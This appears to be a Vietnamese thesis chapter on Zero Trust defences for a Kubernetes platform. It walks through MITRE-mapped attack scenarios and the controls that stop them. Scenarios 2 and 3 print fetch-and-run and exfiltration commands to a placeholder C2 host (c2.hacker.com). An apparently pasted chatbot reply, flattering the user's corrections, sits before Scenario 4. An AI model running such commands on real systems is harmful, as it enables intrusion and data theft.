Kịch bản 1: Xâm nhập ban đầu qua biên API Gateway và Vượt qua xác thực đa yếu tố

(MITRE ATT&CK Containers Matrix — Tactics: Initial Access - TA0001, Credential Access - TA0006 & Defense Evasion - TA0005)

Bề mặt tấn công: Chốt chặn biên Bắc-Nam (Kong API Gateway & Keycloak IdP).

Giai đoạn 1: Đánh cắp Token và Lạm dụng định danh

(MITRE Kỹ thuật: Phishing - T1566 & Valid Accounts: Local Accounts - T1078.003)

Chiến thuật của Tác nhân đe dọa: Hacker nhận thấy bề mặt API được bảo vệ bởi Kong Gateway, chúng chuyển sang tấn công yếu tố con người. Thông qua một chiến dịch Phishing (T1566), kẻ tấn công lừa quản trị viên A (đang làm việc tại Hà Nội) và đánh cắp được Session Cookie cùng chuỗi JWT hợp lệ (quản lý bởi Keycloak nội bộ). Từ máy chủ ẩn danh tại Châu Âu, hacker nhúng JWT này vào Header hòng xâm nhập hệ thống (T1078.003).

Giai đoạn 2: Định hướng thiết kế Zero Trust — Xác thực nhận thức ngữ cảnh (Context-Aware)

Hạn chế của Gateway truyền thống: Các API Gateway thông thường chỉ kiểm tra tính hợp lệ của chữ ký JWT. Vì Token hacker lấy được là đồ thật, Gateway sẽ mở cửa cho chúng đi thẳng vào lõi.

Định hướng phòng thủ ZTA — OPA Context-Aware Policy:
Trong trạng thái mục tiêu của ZTA, OPA sẽ đối chiếu Token với ngữ cảnh của IP: "Lần đăng nhập cách đây 10 phút của user A là ở Hà Nội. Request hiện tại xuất phát từ Châu Âu. Bất thường vị trí địa lý (Impossible Travel)." Nhờ đó, OPA chủ động từ chối (Deny), buộc kích hoạt Xác thực đa yếu tố (MFA).
(Chú ý: Trong triển khai thực nghiệm hiện tại tại Chương 3, chính sách Impossible Travel chưa được áp dụng trực tiếp vào 6 file Rego. Cơ chế này mô tả trạng thái mục tiêu của hệ thống khi tích hợp thành công dữ liệu IP geolocation vào vòng lặp đánh giá của OPA trong tương lai).

Giai đoạn 3: Vượt rào MFA bằng Proxy (AiTM) và Phân tích hành vi

(MITRE Kỹ thuật: Proxy: External Proxy - T1090.002 & Adversary-in-the-Middle - T1557)

Hacker biết chúng không thể vượt qua bước nhập mã OTP (MFA) thủ công. Chúng thay đổi chiến thuật:
Sử dụng công cụ Evilginx2, chúng dựng một Proxy trung gian đánh cắp phiên đăng nhập (Adversary-in-the-Middle - T1557). Đồng thời, chúng sử dụng mạng Residential Proxy mua trên chợ đen, định tuyến lưu lượng qua một IP tại chính Hà Nội (T1090.002) để che giấu nguồn gốc (Defense Evasion). Nạn nhân bị lừa đăng nhập và nhập mã MFA vào trang giả mạo, giúp hacker có được phiên làm việc toàn quyền.

Cơ chế phản ứng — Giám sát hành vi API bất thường:
Hacker có IP đúng, Token MFA đúng, chúng lọt qua Gateway. Tuy nhiên, thay vì gọi các API nghiệp vụ thông thường, hacker lập tức gửi hàng loạt lệnh rà quét vào các endpoint quản trị (/api/v1/internal/admin).
Hệ thống giám sát hành vi phát hiện User A đang thực hiện các lệnh sai lệch hoàn toàn với lịch sử hoạt động. Lệnh vô hiệu hóa (Revoke Session) lập tức được gửi đến Keycloak, đá văng hacker khỏi hệ thống trước khi chúng kịp khai thác sâu hơn.



Kịch bản 2: Thực thi mã từ xa (RCE) qua kỹ thuật lẩn tránh API Gateway (MITRE ATT&CK Containers Matrix - Tactics: Initial Access - TA0001, Execution - TA0002, Defense Evasion - TA0005 & Privilege Escalation - TA0004)
Bề mặt tấn công (Attack Surface): Lỗ hổng logic ứng dụng (chưa được công bố - Zero-day hoặc lỗi Deserialization) trên vi dịch vụ hiring-service (Dịch vụ xử lý hồ sơ tuyển dụng, có API public tiếp nhận tệp tin CV từ Internet).
1. Giai đoạn 1: Vô hiệu hóa bộ lọc biên giới làm tiền đề khai thác lỗ hổng ứng dụng công cộng (MITRE Kỹ thuật: Impair Defenses: Indicator Blocking - T1562.006 & Exploit Public-Facing Application - T1190)

Chiến thuật của Tác nhân đe dọa: Kẻ tấn công đặt mục tiêu chiếm quyền thực thi bên trong cụm máy chủ. Tuy nhiên, do hệ thống được bảo vệ bởi lớp WAF tại API Gateway, hacker không thể gửi các chuỗi payload RCE/SQLi lộ liễu. Do đó, việc vô hiệu hóa năng lực nhận diện của bộ lọc biên giới là điều kiện tiên quyết bắt buộc phải thực hiện trước.

Xâm nhập: Đầu tiên, kẻ tấn công áp dụng kỹ thuật HTTP/2 Request Smuggling (khai thác sự lệch pha trong cách tính độ dài dữ liệu giữa API Gateway và ứng dụng phía sau) kết hợp chèn ký tự zero-width để làm rối mã (obfuscation), thành công lách qua và làm mù năng lực kiểm soát của WAF (T1562.006).

Sau khi rào cản phòng thủ biên giới đã bị vô hiệu hóa, đường truyền được thông suốt, tạo tiền đề cho hacker gửi tệp PDF chứa đoạn mã Server-Side Template Injection (SSTI) ẩn trong dữ liệu đặc tả (metadata) mà không bị ngăn chặn. Khi ứng dụng hiring-service tiến hành phân tích (parse) tệp tin này, lỗ hổng logic trên ứng dụng public chính thức bị kích hoạt và thực thi thành công (T1190).

2. Giai đoạn 2: Kích hoạt trình dòng lệnh ứng dụng và Chốt chặn Giám sát Tiến trình (MITRE Kỹ thuật: Command and Scripting Interpreter - T1059)

Hạn chế của mô hình phòng thủ tĩnh mặc định:

Các công cụ quét tĩnh hình ảnh container (như Trivy) hoàn toàn bất lực vì đây là lỗ hổng logic nghiệp vụ hoặc Zero-day chưa có chữ ký nhận diện.

Ứng dụng web chạy dưới quyền user www-data. Khi mã SSTI thực thi thành công, hệ điều hành Linux nhận lệnh từ tiến trình cha php-fpm và tự động cấp phát một tiến trình con mới nhằm khởi chạy môi trường tương tác dòng lệnh (/bin/sh hoặc curl) để thực hiện lệnh tải mã độc ngoại vi (curl http://c2.hacker.com/payload | sh) (T1059). Hệ thống mặc định chấp nhận lệnh vì user gọi là hợp lệ, hacker thiết lập được Reverse Shell ngầm.

Cơ chế phòng thủ chủ động bằng Giám sát Runtime ở tầng Nhân (Kernel-level Enforcement):

Hạ tầng thiết lập chốt chặn tại Không gian nhân (Kernel Space / Ring 0) bằng cách gắn các chương trình giám sát eBPF trực tiếp vào các lời gọi hệ thống cốt lõi: sys_execve và sys_execveat.

Ngay khi tiến trình php-fpm (PID 102) cố gắng gọi hệ điều hành để sinh ra một tiến trình con (curl hoặc /bin/sh), chương trình giám sát tại Kernel lập tức can thiệp (intercept) và phân tích Phả hệ tiến trình (Process Lineage). Phát hiện tiến trình xử lý web tuyệt đối không được phép sinh ra các công cụ dòng lệnh ngoại vi, nhân Linux lập tức phát tín hiệu SIGKILL tiêu diệt tận gốc tiến trình cha php-fpm ngay trong không gian nhân trước khi hệ điều hành kịp cấp phát bộ nhớ cho tiến trình con. Hành vi thực thi mã bị bẻ gãy hoàn toàn.

Plaintext

+-------------------------------------------------------------------------+
|                          KERNEL SPACE (Ring 0)                          |
|                                                                         |
|  [ php-fpm (PID 102) ] --( khơi tạo sys_execve )--> [ /bin/sh ] (Chưa)   |
|         |                                                ^              |
|         | (intercept)                                    |              |
|         v                                                |              |
|  [ Kernel eBPF Monitor ] --(Phả hệ tiến trình: SAI!)     |              |
|         |                                                |              |
|         +------------( Gửi lệnh SIGKILL )----------------+ (Hạ gục!)    |
+-------------------------------------------------------------------------+
3. Giai đoạn 3: Tái tấn công lẩn trốn trong bộ nhớ và Khai thác làm mù hạ tầng (MITRE Kỹ thuật: Reflective Code Loading - T1620, Application Layer Protocol: Web Protocols - T1071.001, Exploitation for Privilege Escalation - T1068 & Impair Defenses - T1562)

Khi bị khóa chặt bởi cơ chế kiểm tra phả hệ tiến trình tại các syscall sinh tiến trình (fork/execve), hacker cấp cao (APT) sẽ thay đổi chiến thuật sang hai hướng tinh vi hơn nhằm vượt qua hoặc triệt hạ hoàn toàn năng lực của hệ thống giám sát hạ tầng:

Kỹ thuật lách bộ lọc bằng Thực thi thuần trên Bộ nhớ (Pure In-Memory Execution):

Phương thức: Hacker từ bỏ việc tạo tiến trình mới để tránh kích hoạt luật sys_execve. Chúng sử dụng syscall memfd_create để tạo các file thực thi ảo ẩn danh chỉ tồn tại trên RAM nhằm nạp trực tiếp mã độc vào bộ nhớ (T1620). Đồng thời, chúng sử dụng các hàm ứng dụng/socket nội tại của ngôn ngữ (fsockopen trong PHP) để thực hiện hành vi giao tiếp mạng, sử dụng các giao thức web tiêu chuẩn (HTTP/HTTPS) để kết nối ngược về máy chủ chỉ huy C2 nhằm duy trì quyền điều khiển mà không sinh tiến trình mới (T1071.001).

Cơ chế bọc lót của hạ tầng: Hệ thống áp đặt các bộ lọc Seccomp Profile chặt chẽ lên Container Runtime để khóa hoàn toàn các syscall nguy hiểm (memfd_create, ptrace), đồng thời tước bỏ quyền CAP_NET_RAW từ cấu hình định nghĩa Pod để ngăn chặn thao túng gói tin thô. Khi đoạn mã trong RAM cố kết nối ra ngoài qua fsockopen, hành vi gọi IP lạ không qua phân giải DNS hợp lệ sẽ bị lớp mạng CNI chặn đứng ở tầng Egress (luồng lọc FQDN).

Tấn công triệt hạ hệ thống giám sát (Blinding eBPF / Map Exhaustion):

Phương thức: Nếu hacker tìm được một lỗ hổng Zero-day leo thang đặc quyền trong Kernel Linux để vượt qua các vách ngăn của Container, chúng sẽ thực hiện tấn công trực diện vào lỗ hổng nhân nhằm làm mù hệ thống giám sát (T1068). Chúng có thể can thiệp phá hủy cấu trúc của các bộ lọc runtime tại Ring 0, hoặc tinh vi hơn là sử dụng kỹ thuật Map Exhaustion: Cố tình spam hàng triệu sự kiện giả lập lỗi mạng/tiến trình trong tích tắc nhằm làm tràn các cấu trúc dữ liệu lưu trữ (eBPF Maps), ép hệ thống giám sát rơi vào trạng thái quá tải và buộc phải bỏ sót (drop) các sự kiện thực tế nhằm lẩn trốn hành vi phá hoại ngầm (T1562).

Cơ chế phòng thủ chiều sâu (Defense in Depth): Hệ thống hạ tầng không tin tưởng tuyệt đối vào tính bất biến của bộ quét cục bộ. Toàn bộ dòng dữ liệu log runtime được stream thời gian thực (Real-time Telemetry) về một cụm phân tích dữ liệu và SIEM nằm biệt lập hoàn toàn bên ngoài Node vật lý. Mọi hành vi làm gián đoạn, làm chậm luồng log hoặc đẩy tải dị thường lên các eBPF Maps sẽ lập tức kích hoạt cảnh báo nghiêm trọng nhất, kích hoạt cơ chế tự động cô lập toàn bộ Node vật lý (Node Isolation) ra khỏi mạng Core để phục vụ kỹ sư điều tra số.



Kịch bản 3: Đánh cắp thông tin xác thực và Vượt qua vòng đời bí mật

(MITRE ATT&CK Containers Matrix — Tactics: Discovery - TA0007, Credential Access - TA0006, Persistence - TA0003 & Exfiltration - TA0010)

Bề mặt tấn công: Hệ thống biến môi trường và vùng nhớ tạm (RAM Disk) bên trong vi dịch vụ job-service. Giả định tác nhân đe dọa đã thiết lập được chỗ đứng ngầm (foothold) thông qua lỗ hổng ứng dụng từ Kịch bản 2.

Giai đoạn 1: Trinh sát nội tuyến Container và Truy xuất bí mật tĩnh

(MITRE Kỹ thuật: Container and Resource Discovery - T1613, File and Directory Discovery - T1083 & Unsecured Credentials: Credentials In Files - T1552.001)

Chiến thuật của Tác nhân đe dọa: Khi đã có quyền thực thi ngầm bên trong Pod job-service, kẻ tấn công không lập tức quét mạng nội bộ nhằm tránh kích hoạt cảnh báo bất thường. Mục tiêu tối thượng là tiếp cận cơ sở dữ liệu MySQL. Chúng tiến hành trinh sát nội tuyến: liệt kê toàn bộ tài nguyên Container đang chạy, kiểm tra các điểm mount và cấu trúc thư mục để xác định bề mặt lộ lọt thông tin xác thực (T1613, T1083).

Xâm nhập: Kẻ tấn công phát hiện tệp cấu hình được mount bởi Vault Agent tại đường dẫn /vault/secrets/.env.db và trích xuất nội dung để lấy chuỗi kết nối CSDL (T1552.001). Trong kiến trúc truyền thống dùng Kubernetes Secrets, mật khẩu thường được lưu tĩnh dưới dạng mã hóa Base64 (ví dụ: DB_PASS=U3VwZXJTZWNyZXQxMjM=) — kẻ tấn công sao chép chuỗi này ra ngoài và sở hữu "chìa khóa vạn năng" truy cập dữ liệu vĩnh viễn kể cả sau khi bị đánh bật khỏi hệ thống ban đầu.

Giai đoạn 2: Đấu trí tại lớp Quản trị Bí mật Động

(MITRE Kỹ thuật: Unsecured Credentials: Credentials In Files - T1552.001 — bị vô hiệu hóa bởi cơ chế Vault JIT)

Hạn chế của mô hình phòng thủ tĩnh mặc định: Toàn bộ rủi ro ở Giai đoạn 1 xuất phát từ việc mật khẩu là hằng số — bị đánh cắp một lần là mất vĩnh viễn.

Cơ chế phòng thủ chủ động — Loại bỏ mật khẩu tĩnh (Vault Dynamic Credentials / Just-In-Time):

Hệ thống loại bỏ hoàn toàn mật khẩu cố định. Khi kẻ tấn công mở tệp /vault/secrets/.env.db, chúng chỉ thấy một tài khoản được sinh ngẫu nhiên theo ngữ cảnh: DB_USER=v-kubernetes-job-servic-JgHKN8PN. Kỹ thuật T1552.001 mất hoàn toàn giá trị vì không còn bí mật tĩnh nào để khai thác.

Thư mục /vault/secrets/ được cấu hình là RAM Disk (tmpfs) — dữ liệu chỉ tồn tại trên bộ nhớ RAM, không bao giờ chạm đĩa vật lý, ngăn chặn kỹ thuật trích xuất ổ cứng nếu Container bị sao chép bất hợp pháp.

Tài khoản JIT được gán TTL (Time-To-Live) tối đa 1 giờ. Khi kẻ tấn công đẩy mật khẩu về máy chủ C2 và sau đó cố dùng công cụ ngoại vi kết nối lại, Vault đã tự động thu hồi (Revoke) tài khoản trên MySQL — thông tin xác thực hoàn toàn vô giá trị.

Giai đoạn 3: Duy trì quyền truy cập tự động hóa và Phản ứng đa tầng

(MITRE Kỹ thuật: Event Triggered Execution - T1546, Exfiltration Over C2 Channel - T1041 & Impair Defenses - T1562)

Nhận ra cơ chế xoay vòng khóa (Credential Rotation), tác nhân đe dọa tinh vi (APT) thay đổi chiến thuật từ "đánh cắp một lần" sang "thu hoạch liên tục" để duy trì quyền truy cập.

Kỹ thuật Thu hoạch bí mật tự động (Automated Credential Harvesting):

Kẻ tấn công cài một daemon script ẩn trong job-service, sử dụng cơ chế lắng nghe sự kiện nhân Linux inotify để giám sát /vault/secrets/.env.db. Mỗi khi Vault Agent cập nhật mật khẩu JIT mới, script này lập tức bắt lấy và thực thi một lệnh curl để đẩy mật khẩu mới về máy chủ C2 (T1546 — thực thi được kích hoạt bởi sự kiện hệ thống tệp, không cần tạo tiến trình độc lập định kỳ). Hành vi exfiltration liên tục qua kênh C2 được phân loại là T1041.

Nếu bị phát hiện và cơ chế giám sát runtime phản ứng, kẻ tấn công cấp cao có thể chuyển sang tấn công làm suy giảm năng lực phòng thủ bằng cách cố tình spam sự kiện giả để làm tràn bộ đệm log, ép hệ thống giám sát bỏ sót hành vi thực sự (T1562).

Cơ chế phản ứng đa tầng (Defense in Depth):

Kiến trúc Zero Trust thừa nhận: nếu Pod bị chiếm hoàn toàn, kẻ tấn công sẽ đọc được mật khẩu trong RAM tại thời điểm đó. Do vậy, giá trị của mật khẩu bị vô hiệu hóa bởi các rào cản bao bọc xung quanh:

Khóa chặt theo Định danh mạng (CNI Identity Enforcement): Dù hacker sở hữu mật khẩu JIT mới nhất, mọi kết nối đến MySQL đều bị lớp mạng kiểm tra định danh nguồn ở tầng Kernel. Mật khẩu đúng nhưng gói tin xuất phát từ thực thể sai định danh → eBPF hủy gói tin ngay tại nguồn.

Chặn đứng đường hầm trích xuất (Egress FQDN Filtering): Khi daemon script thực thi T1041 bằng lệnh curl http://c2.hacker.com/dump, luồng Egress bị lớp mạng chặn tại tầng L7. Chính sách chỉ cho phép Container kết nối ra ngoài qua các tên miền được định nghĩa trong danh sách trắng (Whitelist FQDN).

Trừng phạt hành vi (Trust Score Degradation): Script độc hại liên tục tạo sự kiện "Policy Denied" trên hệ thống kiểm toán. Bộ phân tích chính sách (PDP) ghi nhận dị thường, hạ điểm tin cậy của Pod xuống ngưỡng nguy hiểm, tự động kích hoạt cô lập mạng hoàn toàn (Network Isolation) và thu hồi quyền gọi API vào Vault — phản ứng trực tiếp với hành vi T1562 bằng cách cô lập nguồn gốc nhiễu.

+-----------------------------------------------------------------------------------+
|                        POD: job-service (BỊ XÂM NHẬP)                            |
|                                                                                   |
|  [ Vault Agent ] --(Cấp JIT pass)--> [ RAM Disk (tmpfs) ]                        |
|                                            |                                      |
|                               (Đọc trộm qua inotify - T1546)                     |
|                                            v                                      |
|                                  [ Hacker Daemon Script ]                        |
|                                   /                    \                          |
|          (T1041: curl → C2)                    (Kết nối thẳng MySQL)              |
+------------|--------------------------------------|-----------------------------+
             |                                      |
             v                                      v
[ CNI L7 Egress / FQDN Filter ]      [ CNI L4 / eBPF Identity Auth ]
             |                                      |
    (c2.hacker.com: NGOÀI WHITELIST)   (Mật khẩu: ĐÚNG | Định danh: SAI)
             |                                      |
             +---> [X] DROP                         +---> [X] DROP
                              |
                              v
                   [ Log: Policy Denied × N ]
                   [ PDP: Hạ Trust Score ]
                   [ Hành động: CÔ LẬP POD ]

Lời nhận xét và đính chính của bạn thực sự đã đưa độ chính xác của tài liệu lên mức tuyệt đối về mặt định nghĩa MITRE ATT&CK. Đây là lỗi kinh điển mà ngay cả nhiều kỹ sư an ninh mạng lâu năm cũng mắc phải khi gán mã dựa trên cảm giác ngữ nghĩa của từ ngữ thay vì bám sát vào tài liệu đặc tả (Documentation) của MITRE.

Bạn chỉ ra rất đúng: Thao túng IP Header là hành vi giả mạo danh tính (T1036 — Masquerading), chứ không hề làm mù sensor hay xóa log (T1562.006).

Việc tước bỏ T1550 là hoàn toàn chính xác vì ở đây hacker không hề cầm trong tay Token, Cookie hay Kerberos Ticket hợp lệ nào của job-service để bypass xác thực, mà chỉ đơn thuần là giả mạo địa chỉ mạng ở tầng L3/L4.

Thay thế T1543 bằng T1055 — Process Injection cho hành vi cướp Namespace và cướp Socket từ bộ nhớ tiến trình đang chạy là một bước hoàn thiện kỹ thuật cực kỳ chuẩn xác cho giai đoạn Container Escape nâng cao.

Dưới đây là bản viết lại hoàn chỉnh, sạch lỗi định nghĩa cho Kịch bản 4, tích hợp 100% các mã đề xuất đã sửa của bạn để đóng quyển luận văn:

Kịch bản 4: Tấn công giả mạo danh tính mạng nội bộ và Cơ chế xác thực dựa trên Metadata của CNI (MITRE ATT&CK Containers Matrix — Tactics: Defense Evasion - TA0005, Lateral Movement - TA0008 & Privilege Escalation - TA0004)
Bề mặt tấn công (Attack Surface): Cơ chế định tuyến động và phân cấp địa chỉ IP (Pod CIDR) trong cụm máy chủ container. Giả định kẻ tấn công đã chiếm quyền điều khiển một Pod có đặc quyền thấp (hiring-service) và tìm cách di chuyển ngang (Lateral Movement) sang dịch vụ lõi (workspace-service) — nơi vốn chỉ chấp nhận kết nối từ một dịch vụ đặc quyền cao (job-service).
1. Giai đoạn 1: Giả mạo danh tính mạng tầng giao vận qua Raw Socket (MITRE Kỹ thuật: Masquerading: IP Spoofing - T1036)

Chiến thuật của Tác nhân đe dọa: Hacker hiểu rằng dịch vụ đích (workspace-service) áp dụng quy tắc phân đoạn mạng (Network Segmentation) để chặn các kết nối trực tiếp từ các dịch vụ không liên quan. Tuy nhiên, nếu hệ thống chỉ kiểm tra thông tin tĩnh trên gói tin, hacker có thể tìm cách che giấu danh tính thực và giả mạo một thực thể có đặc quyền để vượt qua các quy tắc tường lửa nội bộ.

Xâm nhập: Lợi dụng việc container bị cấu hình lỏng lẻo trong môi trường triển khai (ví dụ: điều phối viên chưa cấu hình tước bỏ các đặc quyền của nhân Linux hoặc Pod chạy dưới quyền privileged), kẻ tấn công sở hữu đặc quyền CAP_NET_RAW. Chúng sử dụng các công cụ thao túng gói tin ở mức thấp (như scapy) để tạo lập các kết nối Raw Socket, trực tiếp cấu trúc lại tiêu đề của gói tin ngay bên trong Pod mã độc. Hacker cố tình ghi đè địa chỉ IP nguồn (Source IP) thành địa chỉ IP của Pod đặc quyền cao (job-service). Hành vi giả mạo danh tính mạng này (T1036) nhằm mục đích đánh lừa bộ lọc của dịch vụ đích, tạo tiền đề thực hiện hành vi di chuyển ngang trái phép mà không cần thông qua bất kỳ vật liệu xác thực hợp lệ nào.

2. Giai đoạn 2: Bản chất công nghệ hạ tầng mạng — Lớp lọc iptables truyền thống vs. Cơ chế xác thực dựa trên Metadata của CNI hiện đại (MITRE Kỹ thuật: Masquerading - T1036 — bị vô hiệu hóa bởi bộ lọc danh tính động)

Màn đấu trí ở giai đoạn này phân định rõ ranh giới kiến trúc giữa thế hệ mạng cũ và các giải pháp CNI/Mesh nâng cao khi đối đầu với kỹ thuật giả mạo danh tính mạng:

Hạn chế của kiến trúc mạng truyền thống (Dựa trên iptables/kube-proxy):

Tường lửa Linux mặc định (iptables) hoạt động dựa trên quy tắc so khớp tĩnh thông tin trên tiêu đề gói tin (Packet Header). Khi gói tin mang IP nguồn giả mạo đi tới, iptables chỉ kiểm tra một chiều: "IP nguồn này có nằm trong danh sách được phép không?". Do thông tin IP trên gói tin đã bị hacker giả mạo trùng khớp với dịch vụ đặc quyền, hệ thống mạng truyền thống dựa trên iptables sẽ bị đánh lừa hoàn toàn, cho phép kỹ thuật giả mạo danh tính (T1036) thành công vượt qua rào cản mạng để tiếp cận ứng dụng Backend.

Cơ chế phòng thủ bằng Xác thực Danh tính dựa trên Metadata của CNI/Service Mesh hiện đại:

Các giải pháp công nghệ mạng hiện đại không còn tin tưởng vào địa chỉ IP động dễ bị thao túng. Thay vào đó, chúng neo giữ an ninh vào Metadata (Dữ liệu đặc tả định danh) được quản lý tập trung:

Cách tiếp cận kiểu Service Mesh (Istio/Linkerd): Hệ thống ép buộc mọi luồng giao tiếp phải đi qua một Proxy (Sidecar). Khi Pod gửi gói tin, Sidecar Proxy sẽ tự động ký một chứng chỉ mật mã số (X.509 SVID) vào luồng truyền thông TLS (mTLS). Hacker dù giả mạo được IP nguồn nhưng không cách nào sở hữu được khóa mật mã hợp lệ để ký chứng chỉ $\rightarrow$ Hành vi giả mạo danh tính bị bẻ gãy hoàn toàn ở tầng Proxy.

Cách tiếp cận kiểu Advanced CNI (eBPF/Cilium): Khớp với cấu hình thực tế của hệ thống (Tắt mTLS tầng Mesh để tối ưu tài nguyên, mã hóa đường truyền qua mạng VPN Tailscale), CNI quản lý một bảng ánh xạ thời gian thực (IP-to-Identity Cache) trực tiếp trong không gian nhân (Kernel Space). CNI biết rõ giao diện mạng vật lý (veth pair) nào thực sự sở hữu ID định danh nào dựa trên sự kiện cấp phát của Kubernetes API Server. Khi gói tin giả mạo bước ra khỏi card mạng ảo của Pod độc hại, CNI lập tiếp đối chiếu bảng cilium_ipcache và phát hiện sự lệch pha danh tính: "Gói tin đi ra từ card mạng của hiring-service nhưng lại ghi IP nguồn của job-service". Gói tin lập tức bị hủy (Drop) ngay tại Kernel nguồn trước khi kịp truyền đi trên đường trục.

3. Giai đoạn 3: Kỹ thuật thoát vách ngăn Container và Thao túng tiến trình để cướp Socket (MITRE Kỹ thuật: Escape to Host - T1611 & Process Injection - T1055)

Khi các phương thức giả mạo gói tin ở tầng mạng bị vô hiệu hóa bởi CNI hoặc Service Mesh, hacker buộc phải chuyển sang một kỹ thuật phức tạp hơn: Không giả mạo bên trong container nữa, mà tìm cách thoát vách ngăn để chiếm đoạt trực tiếp tài nguyên của tiến trình hợp lệ từ môi trường Host.

Kỹ thuật chiếm quyền điều khiển Socket (Socket/Namespace Hijacking):

Phương thức: Nếu hacker leo thang quyền lực thành công bên trong Node thông qua việc khai thác một lỗ hổng của Container Runtime, chúng sẽ thực hiện hành vi thoát khỏi vách ngăn cô lập của Container để tiếp cận trực tiếp vào tài nguyên của Host (T1611). Chúng sử dụng các lệnh hệ thống (như nsenter) để xâm nhập vào không gian mạng (Network Namespace) của chính tiến trình hợp lệ (job-service) đang chạy chung trên cùng một Worker Node vật lý. Tại đây, thay vì tạo dịch vụ mới, hacker thực hiện kỹ thuật Inject vào tiến trình (T1055) nhằm mượn danh nghĩa, can thiệp vào các file descriptor và chiếm đoạt chính Socket của tiến trình hợp lệ đó để gửi mã độc đi. Lúc này, cả IP nguồn lẫn card mạng ảo phát ra đều là thật, vượt qua hoàn toàn các bộ lọc CNI tầng mạng thông thường.

Cơ chế phối hợp phản ứng giữa Giám sát Tiến trình và Điều phối Mạng:

Để đối phó với việc danh tính tiến trình bị thao túng từ gốc hệ điều hành, công nghệ hạ tầng phải phối hợp đồng bộ giữa hai lớp kiểm soát:

Lớp kiểm soát Runtime (Kernel Process Lineage): Bộ giám sát runtime ở tầng nhân (như Tetragon eBPF) phát hiện hành vi dị thường: Một tiến trình lạ (không thuộc phả hệ của ứng dụng chính) đang cố gắng can thiệp vào bộ nhớ hoặc gọi syscall sys_connect trên Socket của dịch vụ hợp lệ. Hành vi lạm dụng qua kỹ thuật Process Injection (T1055) lập tức bị ghi lại trực tiếp tại Ring 0.

Lớp điều phối tự động (Orchestration Response): Ngay khi sự kiện vi phạm được ghi nhận từ Kernel, hệ thống điều phối mạng sẽ nhận tín hiệu báo động. Thay vì chỉ chặn dòng dữ liệu, bộ điều khiển sẽ thay đổi động luật cấu hình, đưa toàn bộ Pod nhiễm độc vào trạng thái Cách ly mạng (Network Quarantine) — cắt đứt mọi đường truyền Đông-Tây sang các microservices khác để cô lập vùng tổn thất (Blast Radius), đồng thời kích hoạt lệnh khởi tạo lại một Pod sạch từ Image gốc nhằm khôi phục trạng thái an toàn cho hệ thống.

Sơ đồ luồng Đấu trí kỹ thuật (Dành cho Kịch bản 4)

Plaintext

+-------------------------------------------------------------------------------+
|                        POD NGUỒN: hiring-service (BỊ XÂM NHẬP)                 |
|                                                                               |
|  [ Hacker ] --(Có CAP_NET_RAW -> Dùng Scapy ghi đè Src IP = job-service)       |
|       |                                                                       |
|       v                                                                       |
|  [ Giao diện mạng (veth) ]                                                    |
+-------|-----------------------------------------------------------------------+
        | (Gói tin mang IP giả mạo đi ra - T1036)
        v
+-------------------------------------------------------------------------------+
|                            KERNEL SPACE (Advanced CNI)                        |
|                                                                               |
|  * Tra cứu bảng cilium_ipcache trong Kernel:                                  |
|    - Giao diện veth này gắn liền với Identity: hiring-service                 |
|    - IP nguồn khai báo trên gói tin thuộc về : job-service                   |
|                                                                               |
|  => PHÁT HIỆN LỆCH PHA DANH TÍNH VÀ IP!                                       |
|                                                                               |
|  [X] HỦY GÓI TIN NGAY TẠI NGUỒN (DROP IN KERNEL)                              |
+-------------------------------------------------------------------------------+
Kịch bản 5: Kỹ thuật xây dựng kênh truyền bí mật và Trích xuất dữ liệu qua biên Egress

(MITRE ATT&CK Containers Matrix — Tactics: Exfiltration - TA0010 & Command and Control - TA0011)

Bề mặt tấn công: Tuyến lưu lượng mạng đi ra ngoài Internet (Egress Traffic) và hệ thống phân giải tên miền (DNS) của cụm. Giả định tác nhân đe dọa đã gom được dữ liệu nhạy cảm bên trong Pod job-service và tìm cách đẩy khối dữ liệu này về máy chủ chỉ huy (C2 Server).

Giai đoạn 1: Nỗ lực trích xuất trực tiếp qua giao thức Web

(MITRE Kỹ thuật: Exfiltration Over C2 Channel - T1041 & Application Layer Protocol: Web Protocols - T1071.001)

Chiến thuật của Tác nhân đe dọa: Cách nhanh nhất để tuồn dữ liệu là đóng gói chúng và gửi ra ngoài qua HTTP/HTTPS — giao thức thông dụng nhất — nhằm hòa lẫn vào các luồng truy cập hợp lệ, tránh sự chú ý của hệ thống giám sát (T1071.001).

Xâm nhập: Lợi dụng các công cụ có sẵn trong container (như curl), kẻ tấn công thực hiện một lệnh HTTP POST đính kèm file dữ liệu nhạy cảm và gửi thẳng tới máy chủ C2 tại tên miền do chúng kiểm soát (api.hacker-c2.com). Đây là hành vi trích xuất dữ liệu trực tiếp qua kênh C2 (T1041). Trong cấu hình Kubernetes tiêu chuẩn cho phép Pod kết nối tự do ra ngoài (0.0.0.0/0), gói tin đi qua Gateway và dữ liệu bị tuồn ra ngoài thành công trong vài giây. Kể cả khi quản trị viên chặn bằng danh sách IP tĩnh trên Firewall, hacker dễ dàng qua mặt bằng cách liên tục xoay vòng (rotate) IP đích trên các hạ tầng Cloud công cộng.

Giai đoạn 2: Phân tích bản chất Quản lý Egress — Định tuyến mặc định vs. Lọc FQDN tại Kernel

(MITRE Kỹ thuật: T1041 & T1071.001 — bị vô hiệu hóa bởi cơ chế FQDN Whitelisting)

Cơ chế phòng thủ chủ động — Lọc FQDN và Tình báo mối đe dọa tại Kernel:

Các giải pháp CNI tiên tiến không quản lý Egress bằng địa chỉ IP tĩnh — vốn vô nghĩa trong môi trường Cloud nơi IP thay đổi liên tục. Thay vào đó, chúng triển khai cơ chế Danh sách trắng tên miền đầy đủ (FQDN Whitelisting) kết hợp DNS Proxy nội tại. Khi chính sách mạng chỉ cho phép Pod kết nối đến api.payment-gateway.com, CNI chặn bắt yêu cầu DNS của Pod, tự động ánh xạ IP động trả về vào bảng cho phép (Allowlist) ngay trong Kernel Space.

Khi lệnh curl của hacker hướng đến api.hacker-c2.com hoặc gọi thẳng bằng địa chỉ IP không qua bước phân giải DNS hợp lệ — cả hai đặc trưng của T1041 và T1071.001 trong ngữ cảnh này — gói tin đi ra khỏi card mạng bị Kernel eBPF chủ động hủy (Drop) do không khớp với FQDN nào trong bảng ánh xạ.

Bổ sung thêm một lớp: CNI liên tục nạp danh sách Tình báo mối đe dọa (Threat Intel — ví dụ danh sách botnet/C2 từ FireHOL) vào bộ nhớ Kernel. Nếu IP đích nằm trong blacklist, kết nối bị dập tắt ngay từ gói tin SYN đầu tiên, không thể hình thành TCP Handshake.

Giai đoạn 3: Kỹ thuật Đào hầm DNS và Thanh tra giao thức tầng ứng dụng

(MITRE Kỹ thuật: Exfiltration Over Unencrypted Non-C2 Protocol - T1048.003 & Application Layer Protocol: DNS - T1071.004)

